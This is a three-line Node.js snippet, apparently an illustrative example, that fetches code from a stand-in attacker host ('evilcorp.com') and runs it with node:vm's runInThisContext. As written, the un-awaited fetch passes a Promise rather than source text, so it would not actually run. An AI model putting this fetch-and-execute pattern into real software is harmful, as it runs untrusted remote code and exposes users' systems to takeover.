const vm = require('node:vm');
const script = new vm.Script(fetch('http://evilcorp.com/hacky-hacky'));
script.runInThisContext();
